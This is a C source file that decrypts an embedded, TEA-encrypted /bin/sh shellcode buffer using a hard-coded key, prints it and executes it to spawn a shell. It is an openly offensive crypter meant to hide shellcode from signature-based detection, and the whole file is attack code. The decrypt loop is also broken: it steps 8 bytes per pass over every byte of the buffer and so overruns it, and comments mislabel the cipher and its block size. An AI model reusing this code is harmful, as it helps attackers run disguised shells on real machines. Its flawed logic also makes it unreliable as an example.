#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//Program: Decrypt.c
//Author: Will Summerhill

/* encrypted /bin/sh shellcode here */
unsigned char shellcode[] = \
"\xbb\xf8\x49\x54\x1d\xb3\xb7\x6a\x71\xf0\x7a\x85\x0e\xf7\x94\xdc\x0f\x78\x34\x34\x11\xfa\xa8\x62\xe7\xf6\x4c\x9c\x93\x38\x3e\x4f";

//TES Decrypt function - decrypts one byte at a time
void decrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;
    uint32_t delta=0x9e3779b9;
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];
    for (i=0; i<32; i++) {
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }
    v[0]=v0; v[1]=v1;
}

//Print shellcode
void printfunction(unsigned char* array, int size) {
	int i = 0;
	for (i; i < size; i++) {
		printf("\\x%02x", array[i]);
	}
	printf("\n");
}

main(int argc, char **argv) {
	
	int size = sizeof(shellcode) - 1;
	unsigned char key[16] = "somerandompasswd"; //128 bit key to decrypt
	
	unsigned char* encShellVal;
	encShellVal = shellcode;
	int i = 0;
	for (i; i < size; i++) {
		decrypt((uint32_t *) encShellVal, (uint32_t *) key);
		encShellVal += 8; //continue to next block
	}
	
	//print original shellcode in decrypted format
	printf("\nDecrypted shellcode:\n");
	printfunction(shellcode, size);
	
	
	//execute unencrypted shellcode
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	printf("Spawing /bin/sh shell...\n");
	int (*ret)() = (int(*)())shellcode;
	ret();
}
